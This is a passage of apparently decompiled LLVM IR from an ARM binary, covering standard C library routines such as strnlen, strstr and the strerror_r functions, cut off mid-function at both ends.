  %v2_11938 = phi i32 [ %v6_11938, %._crit_edge ], [ %v2_119386, %dec_label_pc_11928 ]
  %v0_11934 = phi i32 [ %v0_11934.pre, %._crit_edge ], [ %v1_11928, %dec_label_pc_11928 ]
  %v0_11930 = load i32, i32* @r1, align 4
  %v1_11930 = inttoptr i32 %v0_11930 to i8*
  %v2_11930 = load i8, i8* %v1_11930, align 1
  %v3_11930 = zext i8 %v2_11930 to i32
  store i32 %v3_11930, i32* %r3.global-to-local, align 4
  %v5_11930 = add i32 %v0_11930, 1
  store i32 %v5_11930, i32* @r1, align 4
  %v1_11934 = add i32 %v0_11934, -1
  store i32 %v1_11934, i32* %r2.global-to-local, align 4
  %v7_11934 = icmp eq i32 %v0_11934, 1
  store i1 %v7_11934, i1* %cpsr_z.global-to-local, align 1
  %v3_11938 = add i32 %v2_11938, 1
  %v4_11938 = inttoptr i32 %v3_11938 to i8*
  store i8 %v2_11930, i8* %v4_11938, align 1
  %v5_11938 = load i32, i32* %ip.global-to-local, align 4
  %v6_11938 = add i32 %v5_11938, 1
  store i32 %v6_11938, i32* %ip.global-to-local, align 4
  %v0_1193c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1193c, label %bb12, label %bb13

bb12:                                             ; preds = %.preheader
  ret i32 %arg1

bb13:                                             ; preds = %.preheader
  %v0_11940 = load i32, i32* %r3.global-to-local, align 4
  %v2_11940 = icmp eq i32 %v0_11940, 0
  store i1 %v2_11940, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11940, label %dec_label_pc_11948, label %._crit_edge

._crit_edge:                                      ; preds = %bb13
  %v0_11934.pre = load i32, i32* %r2.global-to-local, align 4
  br label %.preheader

dec_label_pc_11948:                               ; preds = %dec_label_pc_11914, %bb13, %dec_label_pc_11948
  %v2_11950 = phi i32 [ %v6_11950, %dec_label_pc_11948 ], [ %v1_11914, %dec_label_pc_11914 ], [ %v6_11938, %bb13 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_1194c = load i32, i32* %r2.global-to-local, align 4
  %v1_1194c = add i32 %v0_1194c, -1
  store i32 %v1_1194c, i32* %r2.global-to-local, align 4
  %v7_1194c = icmp eq i32 %v0_1194c, 1
  store i1 %v7_1194c, i1* %cpsr_z.global-to-local, align 1
  %v3_11950 = add i32 %v2_11950, 1
  %v4_11950 = inttoptr i32 %v3_11950 to i8*
  store i8 0, i8* %v4_11950, align 1
  %v5_11950 = load i32, i32* %ip.global-to-local, align 4
  %v6_11950 = add i32 %v5_11950, 1
  store i32 %v6_11950, i32* %ip.global-to-local, align 4
  %v0_11954 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11954, label %dec_label_pc_11958, label %dec_label_pc_11948

dec_label_pc_11958:                               ; preds = %dec_label_pc_11948
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v6_11950, { 1, 0 }
  uselistorder i32 %v0_1194c, { 1, 0 }
  uselistorder i32 %v6_11938, { 0, 2, 1 }
  uselistorder i32 %v1_11928, { 2, 1, 0 }
  uselistorder i32 %v2_11918, { 2, 1, 0 }
  uselistorder i32 %v1_11908, { 1, 0 }
  uselistorder i32 %v0_11904, { 1, 0 }
  uselistorder i32 %v6_118f8, { 0, 1, 3, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 5, 2, 3, 4, 6, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 7, 1, 10, 2, 3, 4, 5, 6, 8, 9, 11, 12 }
  uselistorder i32 %arg2, { 1, 3, 2, 0, 4, 5 }
  uselistorder i32 %arg1, { 5, 2, 1, 3, 0, 4 }
  uselistorder label %dec_label_pc_11948, { 2, 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
}

define i32 @strnlen(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_1195c = load i32, i32* @r1, align 4
  %v2_1195c = icmp eq i32 %v0_1195c, 0
  br i1 %v2_1195c, label %bb, label %dec_label_pc_1198c

bb:                                               ; preds = %entry
  ret i32 0

dec_label_pc_11974:                               ; preds = %dec_label_pc_1199c
  %v3_11974 = icmp uge i32 %v5_11a28, %v1_11974
  %v9_11974 = icmp eq i32 %v5_11a28, %v1_11974
  %v2_11978 = xor i1 %v3_11974, true
  %v3_11978 = or i1 %v9_11974, %v2_11978
  br i1 %v3_11978, label %bb19, label %bb20

bb19:                                             ; preds = %dec_label_pc_11974
  %v6_11978 = sub i32 %v5_11a28, %tmp
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_11974, %bb19
  %v5_1197c = phi i32 [ %v1_11974, %dec_label_pc_11974 ], [ %v6_11978, %bb19 ]
  %v2_1197c = xor i1 %v9_11974, true
  %v3_1197c = and i1 %v3_11974, %v2_1197c
  br i1 %v3_1197c, label %bb21, label %bb22

bb21:                                             ; preds = %bb20
  %v6_1197c = sub i32 %v5_1197c, %tmp
  br label %bb22

bb22:                                             ; preds = %bb20, %bb21
  %v8_11980 = phi i32 [ %v5_1197c, %bb20 ], [ %v6_1197c, %bb21 ]
  ret i32 %v8_11980

dec_label_pc_11984:                               ; preds = %dec_label_pc_119d0
  br label %dec_label_pc_11a24

dec_label_pc_1198c:                               ; preds = %entry
  %v2_1198c = add i32 %tmp, %v0_1195c
  %v3_1198c = icmp ult i32 %v2_1198c, %tmp
  br i1 %v3_1198c, label %bb23, label %bb24

bb23:                                             ; preds = %dec_label_pc_1198c
  br label %bb24

bb24:                                             ; preds = %dec_label_pc_1198c, %bb23
  %v5_11a28 = phi i32 [ %v2_1198c, %dec_label_pc_1198c ], [ -1, %bb23 ]
  %v1_119ac2 = urem i32 %tmp, 4
  %v2_119ac3 = icmp eq i32 %v1_119ac2, 0
  br i1 %v2_119ac3, label %dec_label_pc_119b4, label %dec_label_pc_1199c

dec_label_pc_1199c:                               ; preds = %bb24, %dec_label_pc_119a8
  %v1_11974 = phi i32 [ %v1_119a8, %dec_label_pc_119a8 ], [ %tmp, %bb24 ]
  %v1_1199c = inttoptr i32 %v1_11974 to i8*
  %v2_1199c = load i8, i8* %v1_1199c, align 1
  %v2_119a0 = icmp eq i8 %v2_1199c, 0
  br i1 %v2_119a0, label %dec_label_pc_11974, label %dec_label_pc_119a8

dec_label_pc_119a8:                               ; preds = %dec_label_pc_1199c
  %v1_119a8 = add i32 %v1_11974, 1
  %v1_119ac = urem i32 %v1_119a8, 4
  %v2_119ac = icmp eq i32 %v1_119ac, 0
  br i1 %v2_119ac, label %dec_label_pc_119b4, label %dec_label_pc_1199c

dec_label_pc_119b4:                               ; preds = %dec_label_pc_119a8, %bb24
  %storemerge.lcssa = phi i32 [ %tmp, %bb24 ], [ %v1_119a8, %dec_label_pc_119a8 ]
  store i32 %storemerge.lcssa, i32* @lr, align 4
  %v3_11a1432 = icmp ult i32 %storemerge.lcssa, %v5_11a28
  br i1 %v3_11a1432, label %dec_label_pc_119bc, label %dec_label_pc_11a24

dec_label_pc_119bc:                               ; preds = %dec_label_pc_11a10, %dec_label_pc_119b4
  %v0_1198439 = phi i32 [ %v4_119bc, %dec_label_pc_11a10 ], [ %storemerge.lcssa, %dec_label_pc_119b4 ]
  %v1_119bc = inttoptr i32 %v0_1198439 to i32*
  %v2_119bc = load i32, i32* %v1_119bc, align 4
  %v4_119bc = add i32 %v0_1198439, 4
  store i32 %v4_119bc, i32* @lr, align 4
  %v2_119c0 = add i32 %v2_119bc, -16843009
  %v2_119c4 = and i32 %v2_119c0, -2139062144
  %v2_119c8 = icmp eq i32 %v2_119c4, 0
  br i1 %v2_119c8, label %dec_label_pc_11a10, label %dec_label_pc_119d0

dec_label_pc_119d0:                               ; preds = %dec_label_pc_119bc
  %v2_119d0 = inttoptr i32 %v0_1198439 to i8*
  %v3_119d0 = load i8, i8* %v2_119d0, align 1
  %v2_119d8 = icmp eq i8 %v3_119d0, 0
  %v1_119dc = add i32 %v0_1198439, 1
  br i1 %v2_119d8, label %dec_label_pc_11984, label %dec_label_pc_119e4

dec_label_pc_119e4:                               ; preds = %dec_label_pc_119d0
  %v2_119e4 = inttoptr i32 %v1_119dc to i8*
  %v3_119e4 = load i8, i8* %v2_119e4, align 1
  %v2_119e8 = icmp eq i8 %v3_119e4, 0
  br i1 %v2_119e8, label %dec_label_pc_11a24, label %dec_label_pc_119f0

dec_label_pc_119f0:                               ; preds = %dec_label_pc_119e4
  %v1_119f0 = add i32 %v0_1198439, 2
  %v2_119f0 = inttoptr i32 %v1_119f0 to i8*
  %v3_119f0 = load i8, i8* %v2_119f0, align 1
  %v2_119f4 = icmp eq i8 %v3_119f0, 0
  br i1 %v2_119f4, label %dec_label_pc_11a24, label %dec_label_pc_11a00

dec_label_pc_11a00:                               ; preds = %dec_label_pc_119f0
  %v1_11a00 = add i32 %v0_1198439, 3
  %v2_11a00 = inttoptr i32 %v1_11a00 to i8*
  %v3_11a00 = load i8, i8* %v2_11a00, align 1
  %v2_11a04 = icmp eq i8 %v3_11a00, 0
  br i1 %v2_11a04, label %dec_label_pc_11a24, label %dec_label_pc_11a10

dec_label_pc_11a10:                               ; preds = %dec_label_pc_11a00, %dec_label_pc_119bc
  %v3_11a14 = icmp ult i32 %v4_119bc, %v5_11a28
  br i1 %v3_11a14, label %dec_label_pc_119bc, label %dec_label_pc_11a24

dec_label_pc_11a24:                               ; preds = %dec_label_pc_11a10, %dec_label_pc_119b4, %dec_label_pc_119e4, %dec_label_pc_119f0, %dec_label_pc_11a00, %dec_label_pc_11984
  %v1_11a24 = phi i32 [ %v0_1198439, %dec_label_pc_11984 ], [ %storemerge.lcssa, %dec_label_pc_119b4 ], [ %v1_119dc, %dec_label_pc_119e4 ], [ %v1_119f0, %dec_label_pc_119f0 ], [ %v1_11a00, %dec_label_pc_11a00 ], [ %v5_11a28, %dec_label_pc_11a10 ]
  %v3_11a24 = icmp uge i32 %v5_11a28, %v1_11a24
  %v9_11a24 = icmp eq i32 %v5_11a28, %v1_11a24
  %v2_11a28 = xor i1 %v3_11a24, true
  %v3_11a28 = or i1 %v9_11a24, %v2_11a28
  br i1 %v3_11a28, label %bb25, label %bb26

bb25:                                             ; preds = %dec_label_pc_11a24
  %v6_11a28 = sub i32 %v5_11a28, %tmp
  br label %bb26

bb26:                                             ; preds = %dec_label_pc_11a24, %bb25
  %v5_11a2c = phi i32 [ %v1_11a24, %dec_label_pc_11a24 ], [ %v6_11a28, %bb25 ]
  %v2_11a2c = xor i1 %v9_11a24, true
  %v3_11a2c = and i1 %v3_11a24, %v2_11a2c
  br i1 %v3_11a2c, label %bb27, label %bb28

bb27:                                             ; preds = %bb26
  %v6_11a2c = sub i32 %v5_11a2c, %tmp
  br label %bb28

bb28:                                             ; preds = %bb26, %bb27
  %v8_11a30 = phi i32 [ %v5_11a2c, %bb26 ], [ %v6_11a2c, %bb27 ]
  ret i32 %v8_11a30

; uselistorder directives
  uselistorder i1 %v3_11a24, { 1, 0 }
  uselistorder i32 %v4_119bc, { 1, 2, 0 }
  uselistorder i32 %v0_1198439, { 0, 6, 5, 4, 3, 1, 2 }
  uselistorder i32 %v1_119a8, { 1, 0, 2 }
  uselistorder i32 %v1_11974, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v5_11a28, { 3, 4, 5, 0, 2, 1, 8, 7, 6 }
  uselistorder i1 %v3_11974, { 1, 0 }
  uselistorder i32 %tmp, { 4, 3, 5, 7, 8, 0, 6, 2, 1 }
  uselistorder label %bb28, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
  uselistorder label %dec_label_pc_11a24, { 0, 4, 3, 2, 1, 5 }
  uselistorder label %dec_label_pc_1199c, { 1, 0 }
  uselistorder label %bb24, { 1, 0 }
  uselistorder label %bb22, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
}

define i32 @strstr(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* @r1, align 4
  %v6_11a3c = load i32, i32* @r5, align 4
  %v9_11a3c = load i32, i32* @r6, align 4
  %v3_11a40 = load i8, i8* %arg2, align 1
  %v2_11a44 = icmp eq i8 %v3_11a40, 0
  br i1 %v2_11a44, label %bb, label %bb50

bb:                                               ; preds = %entry
  ret i32 %arg1

bb50:                                             ; preds = %entry
  %v1_11a4c = add i32 %arg1, -1
  br label %dec_label_pc_11a50

dec_label_pc_11a50:                               ; preds = %dec_label_pc_11a5c, %bb50
  %v0_11a50 = phi i32 [ %v1_11a50, %dec_label_pc_11a5c ], [ %v1_11a4c, %bb50 ]
  %v1_11a50 = add i32 %v0_11a50, 1
  %v2_11a50 = inttoptr i32 %v1_11a50 to i8*
  %v3_11a50 = load i8, i8* %v2_11a50, align 1
  %v2_11a54 = icmp eq i8 %v3_11a50, 0
  br i1 %v2_11a54, label %dec_label_pc_11b2c, label %dec_label_pc_11a5c

dec_label_pc_11a5c:                               ; preds = %dec_label_pc_11a50
  %v9_11a5c = icmp eq i8 %v3_11a50, %v3_11a40
  br i1 %v9_11a5c, label %dec_label_pc_11a64, label %dec_label_pc_11a50

dec_label_pc_11a64:                               ; preds = %dec_label_pc_11a5c
  %v2_11a64 = add i32 %tmp, 1
  %v3_11a64 = inttoptr i32 %v2_11a64 to i8*
  %v4_11a64 = load i8, i8* %v3_11a64, align 1
  %v2_11a68 = icmp eq i8 %v4_11a64, 0
  br i1 %v2_11a68, label %bb51, label %bb52

bb51:                                             ; preds = %dec_label_pc_11a64
  store i32 %v6_11a3c, i32* @r5, align 4
  store i32 %v9_11a3c, i32* @r6, align 4
  ret i32 %v1_11a50

bb52:                                             ; preds = %dec_label_pc_11a64
  %v1_11a74 = add i32 %v0_11a50, 2
  %v1_11ac8 = add i32 %tmp, 2
  %v2_11ac8 = inttoptr i32 %v1_11ac8 to i8*
  br label %dec_label_pc_11ac0

dec_label_pc_11a84:                               ; preds = %dec_label_pc_11b20
  %v3_11a84 = load i8, i8* %v3_11ab8.pn.in, align 1
  store i32 %storemerge43, i32* @ip, align 4
  br label %dec_label_pc_11ab0.preheader

dec_label_pc_11ab0.preheader:                     ; preds = %dec_label_pc_11a84, %dec_label_pc_11ac0
  %v0_11ab04.in = phi i8 [ %v3_11a84, %dec_label_pc_11a84 ], [ %v3_11ab8.pn, %dec_label_pc_11ac0 ]
  %v9_11ab013 = icmp eq i8 %v0_11ab04.in, %v3_11a40
  br i1 %v9_11ab013, label %dec_label_pc_11ab8, label %dec_label_pc_11a90

dec_label_pc_11a90:                               ; preds = %dec_label_pc_11ab0.preheader, %dec_label_pc_11aac
  %v0_11a98 = phi i32 [ %v1_11aac, %dec_label_pc_11aac ], [ %storemerge43, %dec_label_pc_11ab0.preheader ]
  %v0_11a90.in = phi i8 [ %v3_11aac, %dec_label_pc_11aac ], [ %v0_11ab04.in, %dec_label_pc_11ab0.preheader ]
  %v2_11a90 = icmp eq i8 %v0_11a90.in, 0
  br i1 %v2_11a90, label %dec_label_pc_11b2c, label %dec_label_pc_11a98

dec_label_pc_11a98:                               ; preds = %dec_label_pc_11a90
  %v1_11a98 = add i32 %v0_11a98, 1
  %v2_11a98 = inttoptr i32 %v1_11a98 to i8*
  %v3_11a98 = load i8, i8* %v2_11a98, align 1
  store i32 %v1_11a98, i32* @ip, align 4
  %v9_11a9c = icmp eq i8 %v3_11a98, %v3_11a40
  br i1 %v9_11a9c, label %dec_label_pc_11ab8, label %dec_label_pc_11aa4

dec_label_pc_11aa4:                               ; preds = %dec_label_pc_11a98
  %v2_11aa4 = icmp eq i8 %v3_11a98, 0
  br i1 %v2_11aa4, label %dec_label_pc_11b2c, label %dec_label_pc_11aac

dec_label_pc_11aac:                               ; preds = %dec_label_pc_11aa4
  %v1_11aac = add i32 %v0_11a98, 2
  %v2_11aac = inttoptr i32 %v1_11aac to i8*
  %v3_11aac = load i8, i8* %v2_11aac, align 1
  store i32 %v1_11aac, i32* @ip, align 4
  %v9_11ab0 = icmp eq i8 %v3_11aac, %v3_11a40
  br i1 %v9_11ab0, label %dec_label_pc_11ab8, label %dec_label_pc_11a90

dec_label_pc_11ab8:                               ; preds = %dec_label_pc_11a98, %dec_label_pc_11aac, %dec_label_pc_11ab0.preheader
  %v0_11ab8 = phi i32 [ %storemerge43, %dec_label_pc_11ab0.preheader ], [ %v1_11a98, %dec_label_pc_11a98 ], [ %v1_11aac, %dec_label_pc_11aac ]
  %v1_11ab8 = add i32 %v0_11ab8, 1
  br label %dec_label_pc_11ac0

dec_label_pc_11ac0:                               ; preds = %bb52, %dec_label_pc_11ab8
  %storemerge43 = phi i32 [ %v1_11ab8, %dec_label_pc_11ab8 ], [ %v1_11a74, %bb52 ]
  %v3_11ab8.pn.in = inttoptr i32 %storemerge43 to i8*
  %v3_11ab8.pn = load i8, i8* %v3_11ab8.pn.in, align 1
  store i32 %storemerge43, i32* @ip, align 4
  %storemerge = icmp eq i8 %v3_11ab8.pn, %v4_11a64
  br i1 %storemerge, label %dec_label_pc_11ac4, label %dec_label_pc_11ab0.preheader

dec_label_pc_11ac4:                               ; preds = %dec_label_pc_11ac0
  %v1_11ac4 = add i32 %storemerge43, 1
  %v2_11ac4 = inttoptr i32 %v1_11ac4 to i8*
  %v3_11ac4 = load i8, i8* %v2_11ac4, align 1
  %v4_11ac4 = zext i8 %v3_11ac4 to i32
  %v3_11ac8 = load i8, i8* %v2_11ac8, align 1
  %v4_11ac8 = zext i8 %v3_11ac8 to i32
  %v1_11acc = add i32 %storemerge43, -1
  %v9_11ad0 = icmp eq i8 %v3_11ac4, %v3_11ac8
  store i32 %v1_11ac8, i32* @lr, align 4
  store i32 %v1_11ac4, i32* @ip, align 4
  br i1 %v9_11ad0, label %dec_label_pc_11ae0, label %dec_label_pc_11b20

dec_label_pc_11ae0:                               ; preds = %dec_label_pc_11ac4, %dec_label_pc_11adc
  %v0_11af8 = phi i32 [ %v1_11b00, %dec_label_pc_11adc ], [ %v1_11ac8, %dec_label_pc_11ac4 ]
  %v0_11af0 = phi i32 [ %v1_11afc, %dec_label_pc_11adc ], [ %v1_11ac4, %dec_label_pc_11ac4 ]
  %v0_11ae0 = phi i32 [ %v4_11b10, %dec_label_pc_11adc ], [ %v4_11ac4, %dec_label_pc_11ac4 ]
  %v2_11ae0 = icmp eq i32 %v0_11ae0, 0
  br i1 %v2_11ae0, label %bb53, label %bb54

bb53:                                             ; preds = %dec_label_pc_11ae0
  store i32 %v6_11a3c, i32* @r5, align 4
  store i32 %v9_11a3c, i32* @r6, align 4
  ret i32 %v1_11acc

bb54:                                             ; preds = %dec_label_pc_11ae0
  %v1_11ae8 = add i32 %v0_11af0, 1
  %v2_11ae8 = inttoptr i32 %v1_11ae8 to i8*
  %v3_11ae8 = load i8, i8* %v2_11ae8, align 1
  %v1_11aec = add i32 %v0_11af8, 1
  %v2_11aec = inttoptr i32 %v1_11aec to i8*
  %v3_11aec = load i8, i8* %v2_11aec, align 1
  %v4_11aec = zext i8 %v3_11aec to i32
  store i32 %v1_11ae8, i32* @r1, align 4
  %v9_11af4 = icmp eq i8 %v3_11ae8, %v3_11aec
  %v1_11afc = add i32 %v0_11af0, 2
  store i32 %v1_11afc, i32* @ip, align 4
  %v1_11b00 = add i32 %v0_11af8, 2
  store i32 %v1_11b00, i32* @lr, align 4
  br i1 %v9_11af4, label %dec_label_pc_11b08, label %dec_label_pc_11b20

dec_label_pc_11b08:                               ; preds = %bb54
  %v2_11b08 = icmp eq i8 %v3_11ae8, 0
  br i1 %v2_11b08, label %bb55, label %dec_label_pc_11adc

bb55:                                             ; preds = %dec_label_pc_11b08
  store i32 %v6_11a3c, i32* @r5, align 4
  store i32 %v9_11a3c, i32* @r6, align 4
  ret i32 %v1_11acc

dec_label_pc_11adc:                               ; preds = %dec_label_pc_11b08
  %v2_11b10 = inttoptr i32 %v1_11b00 to i8*
  %v3_11b10 = load i8, i8* %v2_11b10, align 1
  %v4_11b10 = zext i8 %v3_11b10 to i32
  %v2_11b14 = inttoptr i32 %v1_11afc to i8*
  %v3_11b14 = load i8, i8* %v2_11b14, align 1
  %v9_11b18 = icmp eq i8 %v3_11b14, %v3_11b10
  br i1 %v9_11b18, label %dec_label_pc_11ae0, label %dec_label_pc_11b20

dec_label_pc_11b20:                               ; preds = %dec_label_pc_11adc, %bb54, %dec_label_pc_11ac4
  %v0_11b20 = phi i32 [ %v4_11ac8, %dec_label_pc_11ac4 ], [ %v4_11b10, %dec_label_pc_11adc ], [ %v4_11aec, %bb54 ]
  %v2_11b20 = icmp eq i32 %v0_11b20, 0
  br i1 %v2_11b20, label %dec_label_pc_11b28, label %dec_label_pc_11a84

dec_label_pc_11b28:                               ; preds = %dec_label_pc_11b20
  store i32 %v6_11a3c, i32* @r5, align 4
  store i32 %v9_11a3c, i32* @r6, align 4
  ret i32 %v1_11acc

dec_label_pc_11b2c:                               ; preds = %dec_label_pc_11a50, %dec_label_pc_11aa4, %dec_label_pc_11a90
  store i32 %v6_11a3c, i32* @r5, align 4
  store i32 %v9_11a3c, i32* @r6, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_11b00, { 0, 2, 1 }
  uselistorder i32 %v1_11afc, { 1, 2, 0 }
  uselistorder i32 %v1_11acc, { 2, 1, 0 }
  uselistorder i8 %v3_11ab8.pn, { 1, 0 }
  uselistorder i8* %v3_11ab8.pn.in, { 1, 0 }
  uselistorder i32 %storemerge43, { 4, 2, 6, 1, 3, 0, 5 }
  uselistorder i8 %v3_11aac, { 1, 0 }
  uselistorder i32 %v1_11aac, { 0, 2, 3, 1 }
  uselistorder i32 %v1_11a50, { 0, 2, 1 }
  uselistorder i8 %v3_11a40, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v9_11a3c, { 4, 0, 1, 2, 3 }
  uselistorder i32 %v6_11a3c, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_11b2c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_11ae0, { 1, 0 }
  uselistorder label %dec_label_pc_11ac0, { 1, 0 }
  uselistorder label %dec_label_pc_11ab8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11a90, { 1, 0 }
  uselistorder label %dec_label_pc_11ab0.preheader, { 1, 0 }
}

define i32 @__GI___glibc_strerror_r(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r1, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_11b3c = call i32 @__xpg_strerror_r()
  %v0_11b40 = load i32, i32* @r4, align 4
  ret i32 %v0_11b40
}

define i32 @__xpg_strerror_r() local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-25 = alloca i32, align 4
  %v3_11b48 = load i32, i32* @r4, align 4
  %v0_11b4c = load i32, i32* @r0, align 4
  %v0_11b58 = load i32, i32* @r1, align 4
  store i32 %v0_11b58, i32* @r8, align 4
  %v0_11b5c = load i32, i32* @r2, align 4
  store i32 %v0_11b5c, i32* @r6, align 4
  %tmp = icmp ult i32 %v0_11b4c, 125
  br i1 %tmp, label %thread-pre-split.preheader, label %dec_label_pc_11b94

thread-pre-split.preheader:                       ; preds = %entry
  store i32 ptrtoint ([8 x i8]* @global_var_19fc8.413 to i32), i32* @r5, align 4
  %v2_11b7c3446 = icmp eq i32 %v0_11b4c, 0
  br i1 %v2_11b7c3446, label %bb26, label %dec_label_pc_11b70.lr.ph

dec_label_pc_11b70:                               ; preds = %dec_label_pc_11b70.lr.ph, %bb
  %v2_11b8841 = phi i1 [ %v2_11b883849, %dec_label_pc_11b70.lr.ph ], [ %v2_11b88, %bb ]
  %v1_11b8c40 = phi i32 [ %v0_11b7c.pr48, %dec_label_pc_11b70.lr.ph ], [ %v2_11b78, %bb ]
  %v0_11b7439 = phi i32 [ %v0_11b80547, %dec_label_pc_11b70.lr.ph ], [ %v1_11b74, %bb ]
  %v1_11b74 = add i32 %v0_11b7439, 1
  store i32 %v1_11b74, i32* @r5, align 4
  br i1 %v2_11b8841, label %bb, label %thread-pre-split.loopexit

bb:                                               ; preds = %dec_label_pc_11b70
  %v2_11b78 = add i32 %v1_11b8c40, -1
  %v2_11b7c = icmp eq i32 %v2_11b78, 0
  %v1_11b80 = inttoptr i32 %v1_11b74 to i8*
  %v2_11b80 = load i8, i8* %v1_11b80, align 1
  %v2_11b88 = icmp eq i8 %v2_11b80, 0
  br i1 %v2_11b7c, label %dec_label_pc_11b88, label %dec_label_pc_11b70

thread-pre-split.loopexit:                        ; preds = %dec_label_pc_11b70
  %v1_11b8035 = inttoptr i32 %v1_11b74 to i8*
  %v2_11b8036 = load i8, i8* %v1_11b8035, align 1
  %v2_11b8838 = icmp eq i8 %v2_11b8036, 0
  br label %dec_label_pc_11b70.lr.ph

dec_label_pc_11b70.lr.ph:                         ; preds = %thread-pre-split.loopexit, %thread-pre-split.preheader
  %v2_11b883849 = phi i1 [ %v2_11b8838, %thread-pre-split.loopexit ], [ false, %thread-pre-split.preheader ]
  %v0_11b7c.pr48 = phi i32 [ %v1_11b8c40, %thread-pre-split.loopexit ], [ %v0_11b4c, %thread-pre-split.preheader ]
  %v0_11b80547 = phi i32 [ %v1_11b74, %thread-pre-split.loopexit ], [ ptrtoint ([8 x i8]* @global_var_19fc8.413 to i32), %thread-pre-split.preheader ]
  br label %dec_label_pc_11b70

dec_label_pc_11b88:                               ; preds = %bb
  br i1 %v2_11b88, label %dec_label_pc_11b94, label %bb26

bb26:                                             ; preds = %thread-pre-split.preheader, %dec_label_pc_11b88
  %v0_11b74.lcssa55 = phi i32 [ %v1_11b74, %dec_label_pc_11b88 ], [ ptrtoint ([8 x i8]* @global_var_19fc8.413 to i32), %thread-pre-split.preheader ]
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_11bc8

dec_label_pc_11b94:                               ; preds = %dec_label_pc_11b88, %entry
  %v3_11b98 = ashr i32 %v0_11b4c, 31
  %v5_11bac = bitcast i32* %stack_var_-25 to i8*
  %v6_11bac = call i32 @_uintmaxtostr(i8* %v5_11bac, i32 %v0_11b4c, i32 %v3_11b98, i32 -10, i32 0)
  %v1_11bb0 = add i32 %v6_11bac, -14
  store i32 %v1_11bb0, i32* @r5, align 4
  store i32 %v1_11bb0, i32* @r0, align 4
  store i32 ptrtoint ([15 x i8]* @global_var_19fb8.415 to i32), i32* @r1, align 4
  store i32 14, i32* @r2, align 4
  %v0_11bc0 = call i32 @memcpy()
  store i32 22, i32* %r7.global-to-local, align 4
  %v0_11bc8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_11bc8

dec_label_pc_11bc8:                               ; preds = %bb26, %dec_label_pc_11b94
  %v0_11bc8 = phi i32 [ %v0_11b74.lcssa55, %bb26 ], [ %v0_11bc8.pre, %dec_label_pc_11b94 ]
  %v1_11bc8 = inttoptr i32 %v0_11bc8 to i8*
  %v3_11bcc = call i32 @strlen(i8* %v1_11bc8)
  %v0_11bd0 = load i32, i32* @r8, align 4
  %v2_11bd0 = icmp eq i32 %v0_11bd0, 0
  %v1_11bd4 = add i32 %v3_11bcc, 1
  store i32 %v1_11bd4, i32* @r4, align 4
  br i1 %v2_11bd0, label %bb27, label %dec_label_pc_11bc8._crit_edge

dec_label_pc_11bc8._crit_edge:                    ; preds = %dec_label_pc_11bc8
  %v1_11bdc.pre = load i32, i32* @r6, align 4
  br label %bb28

bb27:                                             ; preds = %dec_label_pc_11bc8
  br label %bb28

bb28:                                             ; preds = %dec_label_pc_11bc8._crit_edge, %bb27
  %v4_11be0 = phi i32 [ %v1_11bdc.pre, %dec_label_pc_11bc8._crit_edge ], [ 0, %bb27 ]
  %tmp56 = icmp ugt i32 %v1_11bd4, %v4_11be0
  br i1 %tmp56, label %bb29, label %.thread16

bb29:                                             ; preds = %bb28
  store i32 %v4_11be0, i32* @r4, align 4
  store i32 34, i32* %r7.global-to-local, align 4
  br label %.thread16

.thread16:                                        ; preds = %bb28, %bb29
  %v0_11bf014 = phi i32 [ %v4_11be0, %bb29 ], [ %v1_11bd4, %bb28 ]
  %v2_11be8 = icmp eq i32 %v0_11bf014, 0
  br i1 %v2_11be8, label %dec_label_pc_11c0c, label %dec_label_pc_11bf0

dec_label_pc_11bf0:                               ; preds = %.thread16
  store i32 %v0_11bf014, i32* @r2, align 4
  %v0_11bf4 = load i32, i32* @r5, align 4
  store i32 %v0_11bf4, i32* @r1, align 4
  store i32 %v0_11bd0, i32* @r0, align 4
  %v0_11bfc = call i32 @memcpy()
  %v0_11c00 = load i32, i32* @r8, align 4
  %v1_11c00 = load i32, i32* @r4, align 4
  %v2_11c00 = add i32 %v1_11c00, %v0_11c00
  %v3_11c08 = add i32 %v2_11c00, -1
  %v4_11c08 = inttoptr i32 %v3_11c08 to i8*
  store i8 0, i8* %v4_11c08, align 1
  br label %dec_label_pc_11c0c

dec_label_pc_11c0c:                               ; preds = %.thread16, %dec_label_pc_11bf0
  %v0_11c0c = load i32, i32* %r7.global-to-local, align 4
  %v2_11c0c = icmp eq i32 %v0_11c0c, 0
  br i1 %v2_11c0c, label %dec_label_pc_11c1c, label %dec_label_pc_11c14

dec_label_pc_11c14:                               ; preds = %dec_label_pc_11c0c
  %v0_11c14 = call i32 @__errno_location()
  %v0_11c18 = load i32, i32* %r7.global-to-local, align 4
  %v2_11c18 = inttoptr i32 %v0_11c14 to i32*
  store i32 %v0_11c18, i32* %v2_11c18, align 4
  %v0_11c1c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_11c1c

dec_label_pc_11c1c:                               ; preds = %dec_label_pc_11c0c, %dec_label_pc_11c14
  %v0_11c1c = phi i32 [ 0, %dec_label_pc_11c0c ], [ %v0_11c1c.pre, %dec_label_pc_11c14 ]
